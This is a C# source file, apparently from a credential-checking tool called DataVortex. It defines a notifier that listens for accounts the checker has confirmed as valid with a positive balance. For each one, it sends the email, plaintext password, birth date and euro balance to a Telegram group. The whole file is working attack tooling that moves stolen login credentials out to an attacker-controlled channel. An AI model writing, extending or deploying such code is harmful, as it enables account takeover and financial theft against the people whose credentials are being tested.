using DataVortex.Core.Abstractions;
using DataVortex.Core.Accounts;
using DataVortex.Core.Configuration;
using DataVortex.Core.Models;
using Microsoft.Extensions.Logging;

namespace DataVortex.Core.Notifications;

/// <summary>
/// Pushes a Telegram message to a configured group whenever a freshly-found account is <b>VALID with a
/// non-zero balance</b>, reusing the app's existing WTelegram client (no bot, no extra dependency).
/// Subscribes to <see cref="AccountTester.AccountFound"/>. Sends are serialised and best-effort so a
/// notification failure never disturbs the checker.
/// </summary>
public sealed class AccountNotifier : IDisposable
{
    private readonly ITelegramService _telegram;
    private readonly ISettingsService _settings;
    private readonly ILogger<AccountNotifier> _log;
    private readonly SemaphoreSlim _sendGate = new(1, 1);
    private bool _started;

    public AccountNotifier(ITelegramService telegram, ISettingsService settings, ILogger<AccountNotifier> log)
    {
        _telegram = telegram;
        _settings = settings;
        _log = log;
    }

    public void Start()
    {
        if (_started) return;
        _started = true;
        AccountTester.AccountFound += OnAccountFound;
    }

    private void OnAccountFound(CredentialEntry account)
    {
        var s = _settings.Current;
        if (!s.NotifyOnTelegram || string.IsNullOrWhiteSpace(s.NotifyTarget)) return; // notifications off
        if (account.Category != "VALIDE") return;                                     // valid accounts only
        if (account.Credit is not > 0) return;                                        // non-zero balance only

        _ = SendAsync(s.NotifyTarget, account);
    }

    private async Task SendAsync(string target, CredentialEntry account)
    {
        await _sendGate.WaitAsync().ConfigureAwait(false);
        try
        {
            var birth = string.IsNullOrWhiteSpace(account.BirthDate) ? "—" : Esc(account.BirthDate!);
            var html =
                "✅ <b>COMPTE VALIDE</b>\n" +
                "━━━━━━━━━━━━━━\n" +
                $"📧 <b>Email</b> : <code>{Esc(account.Username)}</code>\n" +
                $"🔑 <b>Mot de passe</b> : <code>{Esc(account.Password)}</code>\n" +
                $"🎂 <b>Naissance</b> : {birth}\n" +
                $"💰 <b>Solde</b> : <b>{account.CreditDisplay:0.##} €</b>";
            await _telegram.SendHtmlToTargetAsync(target, html).ConfigureAwait(false);
        }
        catch (Exception ex) { _log.LogWarning(ex, "Notification Telegram échouée pour {Email}", account.Username); }
        finally { _sendGate.Release(); }
    }

    /// <summary>Escapes the characters that are special to Telegram's HTML parse mode.</summary>
    private static string Esc(string? s) => (s ?? "")
        .Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;");

    public void Dispose() => AccountTester.AccountFound -= OnAccountFound;
}
